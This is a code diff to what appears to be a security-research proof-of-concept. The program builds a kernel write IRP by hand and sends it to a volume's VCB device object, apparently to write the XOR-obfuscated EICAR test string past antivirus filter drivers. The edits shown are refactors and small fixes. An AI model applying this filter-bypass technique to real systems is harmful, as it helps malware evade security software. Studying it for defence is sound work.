@@ -83,7 +83,7 @@ bool RunTestUsermodeIo(std::vector<BYTE>& Signature)
     return TRUE;    
 }
 
-_DEVICE_OBJECT* GetVcbDeviceObject( const KernelPtr<FILE_OBJECT>& FileObject ) 
+_DEVICE_OBJECT* GetVcbDeviceObject( KernelPtr<FILE_OBJECT>& FileObject ) 
 {
     // get VPB (volume parameter block)
     KernelPtr<VPB> vpb = FileObject->Vpb;
@@ -108,16 +108,20 @@ KernelPtr<IRP> CraftWriteIrp(
     //
     irp->UserBuffer = InputBuffer;
 
-    irp->Tail.Overlay.OriginalFileObject = (PVOID) FileObject;
-    irp->Tail.Overlay.Thread =  (PVOID) KeGetCurrentThread();
+    auto tail = irp->Tail;
+    tail.Overlay.OriginalFileObject = (PVOID) FileObject;
+    tail.Overlay.Thread =  (PVOID) KeGetCurrentThread();
+    irp->Tail = tail;
 
-    KernelPtr<IO_STACK_LOCATION> stackLocation = irp->Tail.Overlay.CurrentStackLocation;
+    KernelPtr<IO_STACK_LOCATION> stackLocation = tail.Overlay.CurrentStackLocation;
     stackLocation->MajorFunction = IRP_MJ_WRITE;
     stackLocation->DeviceObject = DeviceObject;
     stackLocation->FileObject = FileObject;
 
-    stackLocation->Parameters.Write.ByteOffset.QuadPart = 0;
-    stackLocation->Parameters.Write.Length = InputSize;
+    auto writeParameters = stackLocation->Parameters;
+    writeParameters.Write.ByteOffset.QuadPart = 0;
+    writeParameters.Write.Length = InputSize;
+    stackLocation->Parameters = writeParameters;
 
     return irp;
 }
@@ -184,7 +188,8 @@ bool RunTestKernelIo(std::vector<BYTE>& Signature)
     //
 
     // The IRP should be sent into the VCB's device object.
-    _DEVICE_OBJECT* vcbDeviceObject = GetVcbDeviceObject(maliciousFile);
+    KernelPtr<FILE_OBJECT> fileObject = maliciousFile;
+    _DEVICE_OBJECT* vcbDeviceObject = GetVcbDeviceObject(fileObject);
     std::cout << "[*] VCB Device object: 0x" << std::hex << kAddress(vcbDeviceObject) << std::endl;
     
     IO_STATUS_BLOCK iosb = {0};
@@ -293,7 +298,7 @@ int main()
 
     for (size_t i = 0; i < sizeof(EicarSignatureXored); i++)
     {
-        eicar[i] = EicarSignatureXored[i] ^ 0x37;
+        eicar.push_back(EicarSignatureXored[i] ^ 0x37);
     }
 
     bool succeeded = RunTestUsermodeIo(eicar);
